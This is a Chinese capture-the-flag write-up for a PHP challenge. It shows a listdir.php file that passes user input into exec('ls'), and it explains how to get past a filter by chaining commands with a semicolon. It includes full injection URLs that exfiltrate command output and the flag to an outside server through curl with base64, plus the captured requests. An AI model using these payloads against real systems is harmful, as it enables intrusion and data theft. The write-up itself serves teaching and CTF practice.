# 知X堂的php教程

本题有三种方法解题

## 方法一(期望解)

点击教案，发现可以列文件，读文件，但不能列文件夹。尝试读`listdir.php`源码，发现命令注入

```php
<!DOCTYPE html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
  <title>教案</title>
</head>
<body>

<?php
include("waf.php");

// 设置目录名称并进行扫描。
$search_dir = $_GET['dirname'];
$title = "教案";

// 防止命令注入
$search_dir = shellWaf($search_dir);

//$contents = scandir($search_dir); 或者使用
exec("ls $search_dir", $contents);

print "<h1>$title</h1><hr/><br/>";

// 列出文件。
foreach ($contents as $item) {
	if ( is_file($search_dir . '/' . $item) AND substr($item, 0, 1) != '.' ) {

	// 打印信息。
	print "<a href=\"displaySourceCode.php?phpfile=$search_dir/$item\">$item</a><br/>";
	}
}
?>

</body>
</html>
```
`waf.php`过滤了`|`，`&`，`<`，`>`。可以用`;`多语句执行shell命令。因为没有回显需要外带。

vps上nc监听，提交以下内容
```
http://47.94.239.194:8082/listdir.php?dirname=/etc;curl%2047.94.239.194:8080?a=`php%20-r%20%22echo%20base64_encode(shell_exec(%27ls%20/%27));%22`
```

获取到
```
GET /?a=YmluCmJvb3QKZGV2CmV0YwpmbGFnZ2dnZ2dnZ2dnZ2dnZ18xc19oZXJlCmhvbWUKbGliCmxpYjMyCmxpYjY0CmxpYngzMgptZWRpYQptbnQKb3B0CnByb2MKcm9vdApydW4Kc2JpbgpzcnYKc3RhcnQuc2gKc3lzCnRtcAp1c3IKdmFyCg== HTTP/1.1
Host: 47.94.239.194:8080
User-Agent: curl/7.58.0
Accept: */*
```

解码
```
bin
boot
dev
etc
flagggggggggggggg_1s_here
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
start.sh
sys
tmp
usr
var
```

读flag
```
http://47.94.239.194:8082/listdir.php?dirname=/etc;curl%2047.94.239.194:8080?a=`php%20-r%20%22echo%20base64_encode(shell_exec(%27cat%20/flagggggggggggggg_1s_here/flag%27));%22`
```

```
GET /?a=U1lDe01hazNfWlhUX3NoKnRfNG9yZVZlcn0K HTTP/1.1
Host: 47.94.239.194:8080
User-Agent: curl/7.58.0
Accept: */*
```

## 方法二

为了降低难度，我没有禁用`/tmp`目录。可以尝试在`/tmp`目录下写`sh`文件，然后执行。
后期有人搅屎，把flag复制到了`/tmp`下，破坏了题目体验。我便将`/tmp`链接到了null，给师傅们带来不便，请谅解。

## 方法三(非预期)

因为`docker-compose`文件没有写好，导致`/proc/self/mounts`泄露了`flag`路径，可以直接读
